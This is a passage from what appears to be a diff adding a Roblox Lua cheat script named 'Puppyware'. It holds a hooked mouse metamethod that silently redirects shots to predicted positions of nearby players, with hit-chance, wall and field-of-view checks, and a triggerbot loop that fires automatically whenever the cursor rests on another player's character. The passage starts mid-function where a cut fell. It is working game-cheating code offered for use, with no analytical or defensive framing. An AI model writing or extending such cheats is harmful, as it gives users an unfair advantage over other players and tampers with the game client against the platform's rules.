+                    local Prediction = (PuppywareSettings.Aiming.TargetAimSettings.MovementPrediction and TargetPart.CFrame + (TargetPart.Velocity * PuppywareSettings.Aiming.TargetAimSettings.MovementPredictionAmount) or TargetPart.CFrame + (TargetPart.Velocity * PuppywareSettings.Aiming.AimingSettings.GetVelocity))
+                    
+                    if hitsound then
+                        local sound = Instance.new("Sound",game.Workspace)
+                        sound.SoundId = "rbxassetid://2868331684"
+                        if not sound.IsPlaying then
+                            sound:Play()
+                        end
+                    end
+                    return (tostring(key) == "Hit" and Prediction or tostring(key) == "Target" and TargetPart)
+                end
+            end
+        else    
+            if PuppywareSettings.Aiming.SilentAim.Enabled and ChanceTable(PuppywareSettings.Aiming.AimingSettings.HitChanceAmount) == "HitPercent" then
+                local NearestTarget, NearestDistance = NearestType(PuppywareSettings.Aiming.SilentAim.UseNearestDistance and "Distance" or "Mouse")
+    
+                if NearestTarget and (not PuppywareSettings.Aiming.SilentAim.GrabbedCheck or not Grabbing(NearestTarget)) and (not PuppywareSettings.Aiming.SilentAim.KnockedOutCheck or not Knocked(NearestTarget)) and (not PuppywareSettings.Aiming.SilentAim.ShowFOV or PuppywareSettings.Aiming.FOV.SilentAimSize > NearestDistance) and (not PuppywareSettings.Aiming.SilentAim.WallCheck or IsVisible(NearestTarget.Character.Head.Position, {NearestTarget.Character, LocalPlayer.Character, CurrentCamera}) == true) then
+                    local TargetPart = (NearestTarget.Character.Humanoid:GetState() == Enum.HumanoidStateType.Freefall and NearestTarget.Character.LeftFoot or NearestTarget.Character[RandomTable(PuppywareSettings.Aiming.SilentAim.Hitboxes)])
+                    local Prediction = (PuppywareSettings.Aiming.TargetAimSettings.MovementPrediction and TargetPart.CFrame + (TargetPart.Velocity * PuppywareSettings.Aiming.TargetAimSettings.MovementPredictionAmount) or TargetPart.CFrame + (TargetPart.Velocity * PuppywareSettings.Aiming.AimingSettings.GetVelocity))
+    
+                    return (tostring(key) == "Hit" and Prediction or tostring(key) == "Target" and TargetPart)
+                end
+            end
+        end
+        
+    end
+
+    return __index(self, key)
+end)
+
+while wait() do
+    if PuppywareSettings.Aiming.TriggerBot.Enabled then
+        for i, v in next, Players:GetPlayers() do 
+            if Alive(v) then 
+                if Mouse.Target:IsDescendantOf(v.Character) then 
+                    mouse1press()
+                    wait()
+                    mouse1release()
+                    if PuppywareSettings.Aiming.TriggerBot.Delay then
+                        wait(PuppywareSettings.Aiming.TriggerBot.DelayAmount)
+                    end
+                end 
+            end
+        end
+    end
+end
